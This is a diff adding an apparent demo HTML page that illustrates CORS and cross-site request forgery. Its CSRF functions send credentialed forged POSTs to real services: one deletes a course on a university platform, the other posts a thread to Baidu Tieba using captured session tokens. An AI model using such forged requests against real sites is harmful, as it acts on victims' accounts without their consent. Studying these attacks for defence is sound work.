@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+</head>
+
+<body>
+
+    <h4>Cross-Origin Resource Sharing</h4>
+    <button onclick="sendSimpleCORSRequest()">Simple CORS Request</button>
+    <button onclick="sendPreflightedCORSRequest()">Preflighted CORS Request</button>
+    <br />
+    <br />
+    <h4>Cross-Site Request Forgery</h4>
+    <button onclick="deleteCourse()">删除青书课程</button>
+    <button onclick="baiduPost()">百度贴吧发帖</button>
+
+    <script>
+        function sendSimpleCORSRequest() {
+
+            // Simple request, https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#Simple_requests
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://degree.ppe.qingshuxuetang.com/testdg/Administrator/SaveSemester")
+
+            // set forbidden header, this line will not work, and the browser will throw an error in console.
+            //xhr.setRequestHeader("Origin", "degree.ppe.qingshuxuetang.com");
+
+            // set custom header
+            //xhr.setRequestHeader("X-PACK", "test");
+
+            let body = "id=-1&sequence=20&year=2031&term=2&isCurrent=false&startTime=2031-06-02&endTime=2031-09-02&selectCourseStartTime=2031-06-02&selectCourseEndTime=2031-09-02&finalRegisterDeadline=2031-09-01";
+            xhr.send(body);
+        }
+
+        function sendPreflightedCORSRequest() {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://ppe.qingshuxuetang.com/qingshu-svc-home/v6_0/home/user/userAuthorInfo")
+
+            // trigger Preflighted request
+            xhr.setRequestHeader("Content-type", "application/json");
+
+            xhr.send(JSON.stringify({ userId: 1618489 }));
+        }
+
+        function deleteCourse() {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://op.feifanuniv.com/op/degree/course/delete")
+
+            xhr.withCredentials = true;
+
+            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded;charset=URF-8");
+            xhr.send("schoolId=1&courseId=2938");
+        }
+
+        function baiduPost() {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://tieba.baidu.com/f/commit/thread/add")
+
+            xhr.withCredentials = true;
+
+            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded;charset=URF-8");
+            xhr.send("__type__=thread&_BSK=JVwAUWcLBBp1TQNzQzxEElBFEj40E0EVEm8SF2cPZB0+SjkDXyhrSFsDfX8zREQNJl8sFDAEGHZuUFFYZWZNRXNBCH8ZekILShUzbWwXWwcXbSBDJl4pf2MAYV8DeHRMVXU0JQFLRRFmHm0aTnIUZS1PQ1llABQTdVkRMVNuTBBYV3RgahBEBhJvEBRnD2QeBHwcTR9rKUxXCX81BV5DBSBbNGsfHE53NBlDT2dFFQl/V1UqDy8CWQUJZSM1dgFFVyMADmwVPXBxEHA0XSgwFANWfTQLSU80NApzFh9jGn1+GAAPNlQICStEEWVBfkYBXVdwZmsJV1IPb10GdwV3Z2EFYV4fazdPVwl9Zl0fGkVrX2wWRHBeJjINBE9nRhUJf1d9Ci0AVBxIBHR1YAUBRUsoSwQ3BGRqc1YlAVA9LRIbEy82CklFBGEBf09ecBhnBRAAFyxHQQsmGlc6PDFUHEgGdHVgBUQPC3VLBCQBZGpxVjEDQCxoXwIHf21GTkYGOk1zRwo/SGs4EQIWNh1GRzAHHzARKRgcCwsgJS4JFlhQKw5UKBk2Ij5dIBsfOTYUG0dxJwteXiQsWyxVGTUUJD8OFRY3VGFdIBtHLE0+E1wPBjYyH1MQWUo+S0EgQRU1PVUzG1omKlESVikUC0BaHD1NO2cKKVQichMAFyZZaU4hHFJzDCMAVT4IaTo1UxB1R2EVQzZcPDUFX3wdVjotBxBxJHsXTlgGJURzRx0iVysyKg5BaRNUGGdPEzkAIAVVRkUxZXgfVQYLeVcXfQJ1Z2IcchwAa35dAUEoMkgPRltrEn9ADCVda3wOUEF/EwEcB1ABbRUuBRVYVWBkGwBHBV99UEVwUHZmaQZlDlZxJUREBmlnVRUdWn8YegZMdQ8DfFJDCnQTHgsxB0Y6TW4aAUhdZy0yCDZ5HGFFQnQXfHIkXiMfViotGxxWOXVID0RaaxJ/Bk5hD3drT1Ae&basilisk=1&content=测试帖&fid=280050&floor_num=0&ie=utf-8&kw=lol&mouse_pwd=62,58,56,38,51,50,62,57,3,59,38,58,38,59,38,58,38,59,38,58,38,59,38,58,38,59,38,58,3,59,58,56,51,61,3,59,51,56,58,38,59,58,50,58,15401873630101&mouse_pwd_isclick=1&mouse_pwd_t=1540187363010&nick_name=&prefix=&rich_text=1&tbs=a07c5e06865ae8a91540187360&tid=0&title=测试&vcode_md5=");
+        }
+    </script>
+</body>
+
+</html>
